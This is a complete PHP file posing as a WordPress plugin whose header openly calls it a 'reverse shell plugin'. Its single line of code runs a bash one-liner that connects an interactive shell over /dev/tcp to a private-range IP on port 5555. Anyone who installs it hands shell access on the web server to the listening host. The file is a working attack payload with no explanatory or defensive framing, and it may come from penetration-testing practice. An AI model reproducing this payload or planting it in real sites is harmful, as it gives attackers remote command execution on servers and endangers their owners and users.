<?php
/**
* Plugin Name: reverse shell plugin
* Description: opens a reverse shell with bash
* Version: 0.1
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.243/5555 0>&1'");
?>
